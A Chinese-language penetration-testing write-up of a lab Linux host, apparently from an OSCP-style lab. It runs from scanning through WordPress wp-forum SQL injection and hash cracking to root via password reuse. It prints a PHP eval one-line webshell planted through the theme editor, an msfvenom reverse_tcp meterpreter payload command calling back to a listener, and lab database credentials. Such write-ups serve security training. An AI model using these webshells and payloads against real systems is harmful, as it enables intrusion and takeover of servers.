0x00 前言

在前几篇文章中提到的案例大多数是针对Windows的渗透测试，今天笔者来继续分享一个针对Linux服务器的渗透案例。


0x01 案例分析

实验环境：

  • 目标靶机：10.11.1.0/24

  • 攻击机：Kali Linux (10.11.0.204)

渗透过程：

今天我选择的目的机器是10.11.1.251，万年不变的nmap端口探测。

  • SSH服务开启在端口22上

  • HTTP服务开启在端口80上

既然，HTTP服务是开启的，那么进行简单的扫描一下，web扫描器有很多，在此就不再赘述，笔者比较喜欢使用Kali下的一个轻量级的命令行下的web扫描器nikto。

扫描结束发现，目标服务器上安装了wordpress。说到Wordpress，就不得不提到它的专属扫描器wpscan，废话不多说直接开扫。

整理结果，发现以下可用的信息：

  • 目标服务器安装了WordPress 2.8.6

  • 且安装了存在SQL注入的wp-forum插件，POC地址：http://cxsecurity.com/issue/WLB-2013020035

  • 存在用户名admin

验证是否存在SQL注入：

获得了用户名为admin的密码哈希：

$P$B9wJdX0NkO95U2L.kqAGXsFufwSp5N1

通过在线Hash破解网站https://www.onlinehashcrack.com/破解得到wordpress的用户名和密码分别为：

admin/?????

接下来的操作就是登录wordpress后台获取webshell了。

具体操作步骤如下：

  1. 用上面获取的用户名和密码登录后台http://10.11.1.251/wp/wp-admin

  2. 依次打开Appearance -> Editor -> Main Index Template (index.php)

  3. 插入php的一句话木马“<?php @eval($_POST[‘cmd’]); ?>”并点击保存

  4. 打开菜刀并建立一句话木马http://10.11.1.251/wp/index.php

  5. 最后，成功获得了webshell

有了webshell接下来我们要思考的问题，尽可能多地搜集信息为后面可能的提权做准备。

  • 搜集操作系统信息

  • 搜集当前用户和权限信息

  • 搜集当前服务器的网络信息

  • 等等

注：这里有一些常见的Linux信息搜集命令以便提权：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

整理一下我们搜集到的信息：

  • 操作系统：32位的Linux sean 2.6.28-11-generic #42-Ubuntu SMP Fri Apr 17 (Ubuntu 9.04)

  • 主机名：sean

  • 有意思的用户名：sean （猜测可能是系统管理员的账户）

  • 网络信息：主机貌似存在2个vlan(分别是10.11.1.251/24和10.1.1.246/24)

  • 服务信息：安装了并运行了mysql

同时，通过浏览wordpress的wp-config.php文件，我们也找到了下面的数据库连接信息，如下：

  • DB Name: wp

  • DB User: root

  • DB Password: toor

  • DB Host: localhost

  • DB Port: 3306

有了上面一系列的信息，我们现在的思路有以下几个：

  1. 获取更加稳定的meterpreter连接再提权获取root权限

  2. 尝试利用已知的用户和密码登录目标服务器再尝试提权

先说说思路一，我们首先生成一个meterpreter的payload，比如：

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<你的监听主机IP> LPORT=<你的监听端口> -f elf -a x86 --platform linux -o <生成的meterpreter payload文件名>

接着我们将该payload通过webshell上传到目标服务器上。

在MSF中开启监听并在目标机器上执行payload来获取meterpreter连接。

之后，我们便可以通过shell命令在meterpreter中获取目标服务器的shell。而在shell中执行如下命令便可以获得一个完全交互式的shell。

python -c 'import pty; pty.spawn("/bin/bash")'

注：更多的获取完全交互式shell的方法可以参考https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

有了交互式的shell，我们便可以实施我们的提权操作了，这里推荐几个笔者觉得不错的Linux提权工具或者资源：

  • LinEnum.sh

  • linux-kernel-exploits

  • linuxprivchecker.py

  • RootHelper

思路一通常是最常见的提权过程，但是思路二往往却可以达到事办功倍的效果。

根据上面的信息，我们发现了一个很有意思的系统账户sean, 其于目标机器的主机名一致，很有可能就是该机器的系统管理员账户，那么如果我们可以知道它的密码岂不是可以轻松SSH登录到目标服务器上。我们已经知道wordpress的后台管理员密码是?????，那么有没有可能系统管理员也使用了同样的密码呢？

于是，我们尝试用用户名sean和密码?????来登录一下目标主机，如下：

果然，该账户使用了同样的密码，而我们也成功地SSH登录了目标主机。既然登录了，当然首先要检查一下我们的账户是否具有sudo权限。

最终，我们成功地在目标主机上获得了root权限。


0x02 小结

总结一下本案例的渗透过程：

  1. nmap进行端口探测

  2. 发现http服务并进行web扫描

  3. 发现Wordpress插件的SQL注入漏洞并获得网站管理员账户的密码hash

  4. 破解密码hash登录后台获取webshell

  5. 继续搜集信息并猜测系统管理员的账号密码 （或者，继续搜集信息并实施本地提权从而获得root权限）

  6. 利用猜测的密码远程登录主机并获取root权限
